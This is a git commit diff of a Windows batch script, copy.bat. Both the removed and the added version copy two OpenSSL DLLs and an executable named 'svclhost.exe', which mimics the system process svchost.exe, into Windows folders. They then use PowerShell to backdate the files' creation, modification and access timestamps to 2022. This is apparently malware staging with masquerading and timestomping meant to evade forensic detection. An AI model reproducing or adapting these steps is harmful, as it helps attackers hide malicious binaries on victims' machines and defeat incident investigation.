27027049c0deec7a3cf067e96e8d0e2d54901bad
NoManCan <tiger_man_student@yahoo.com>
2025-03-26 23:45:17 +0400

    Update copy.bat

--- copy.bat
+++ copy.bat
@@ -1,15 +1,10 @@
-copy /y "C:\Windows\Temp\libssl-3.dll" "C:\Windows\libssl-3.dll"
-copy /y "C:\Windows\Temp\libcrypto-3.dll" "C:\Windows\libcrypto-3.dll"
-copy /y "C:\Windows\Temp\svclhost.exe" "C:\Windows\svclhost.exe"
+cd "C:\Windows\Temp"
+mkdir 0test0
+copy /y "C:\Windows\Temp\libssl-3.dll" "C:\Windows\Temp\0test0\libssl-3.dll"
+copy /y "C:\Windows\Temp\libcrypto-3.dll" "C:\Windows\Temp\0test0\libcrypto-3.dll"
+copy /y "C:\Windows\Temp\svclhost.exe" "C:\Windows\Temp\0test0\svclhost.exe"
+cd "C:\Windows\Temp\0test0"
 
-powershell -inputformat none -outputformat none -NonInteractive -Command (Get-Item "C:\Windows\libcrypto-3.dll").CreationTime=("13 July 2022 13:51:00")
-powershell -inputformat none -outputformat none -NonInteractive -Command (Get-Item "C:\Windows\libcrypto-3.dll").LastWriteTime=("13 July 2022 13:51:00")
-powershell -inputformat none -outputformat none -NonInteractive -Command (Get-Item "C:\Windows\libcrypto-3.dll").LastAccessTime=("13 July 2022 13:51:00")
-powershell -inputformat none -outputformat none -NonInteractive -Command 
-powershell -inputformat none -outputformat none -NonInteractive -Command (Get-Item "C:\Windows\libssl-3.dll").CreationTime=("13 July 2022 13:51:00")
-powershell -inputformat none -outputformat none -NonInteractive -Command (Get-Item "C:\Windows\libssl-3.dll").LastWriteTime=("13 July 2022 13:51:00")
-powershell -inputformat none -outputformat none -NonInteractive -Command (Get-Item "C:\Windows\libssl-3.dll").LastAccessTime=("13 July 2022 13:51:00")
-powershell -inputformat none -outputformat none -NonInteractive -Command 
-powershell -inputformat none -outputformat none -NonInteractive -Command (Get-Item "C:\Windows\svclhost.exe").CreationTime=("13 July 2022 13:51:00")
-powershell -inputformat none -outputformat none -NonInteractive -Command (Get-Item "C:\Windows\svclhost.exe").LastWriteTime=("13 July 2022 13:51:00")
-powershell -inputformat none -outputformat none -NonInteractive -Command (Get-Item "C:\Windows\svclhost.exe").LastAccessTime=("13 July 2022 13:51:00")
+powershell -Command "Get-ChildItem -force C:\Windows\Temp\0test0 * | ForEach-Object{$_.CreationTime = ('15 January 2022 10:00:00')}"
+powershell -Command "Get-ChildItem -force C:\Windows\Temp\0test0 * | ForEach-Object{$_.LastWriteTime = ('15 January 2022 10:00:00')}"
+powershell -Command "Get-ChildItem -force C:\Windows\Temp\0test0 * | ForEach-Object{$_.LastAccessTime = ('15 January 2022 10:00:00')}"
